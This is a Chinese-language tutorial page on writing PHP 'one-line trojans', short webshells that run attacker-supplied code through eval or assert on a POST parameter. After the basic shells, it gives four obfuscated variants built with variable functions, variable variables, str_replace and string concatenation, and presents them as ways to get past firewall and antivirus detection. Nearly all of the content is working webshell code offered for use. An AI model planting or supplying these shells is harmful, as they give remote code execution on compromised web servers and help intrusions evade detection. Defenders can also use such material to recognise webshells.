---
description: 主要是因为自己以前常常不会用一句话木马，所以专门写一个栏目来讲解如何写一句话木马，当时不知道为什么脑子总转不过弯，写不会。
---

# 🥥 编写一句话木马

## <mark style="color:blue;background-color:green;">（1）一句话木马是什么</mark>

首先最简单最常见的一句话

```php
<?php @eval($_POST['x']) ?>

<?php @assert($_POST['x'])?>
```

虽然是最简单，但是也可能会劝退人，也是讲解一下这句话是什么意思吧。@是就算代码是个错的依然执行；eval是执行代码的函数，这个x就是我们连接木马管理器的一个木马（可能这个地方不太知道是正常的，等后面介绍木马管理器的使用的时候就理解了）。

接下来，对这句简单的话进行变形，通过这些变形，我们可以绕过一些防火墙的拦截，就是我们常说的“免杀”。

### <mark style="color:purple;background-color:yellow;">①一句话木马的不同形态</mark>

#### 1）形态一：

```php
<?php 
$a="eval";
$a(@$_POST['x']);
?>
```

这段代码简化的关键语句是`eval(@$_POST['X'])和基本形态没有什么区别。这应该也算是最简单的免杀了。`

#### 2)形态二

```php
<?php
$bb="eval";
$a="bb";
$$a($_POST['x']);
?>
```

这些都是php语法的简单变形，但是语句都是一样的，就不多说了。

#### 3）形态三

这个地方运用了一个函数str\_replace()函数

> str\_replace():子字符串替换
>
> **`str_replace`**`(array|string $search,array|string $replace, string|array $subject, int &$count =`` `**`null`**`): string|array`
>
> 第一个参数是茶渣的目标值，第二参数是search的替换值，第三个参数是执行替换的数组或者字符串。

所以这个变形形态就是

```php
<?php
$a=str_replace("hello","","evhelloal");
$a(@$_POST['x']);
?>
```

#### 4)形态四

```php
<?php
$a='e'.'v';
$b='a'.'l';
$c=$a.$b;
$c($_POST['x']);
?>
```



















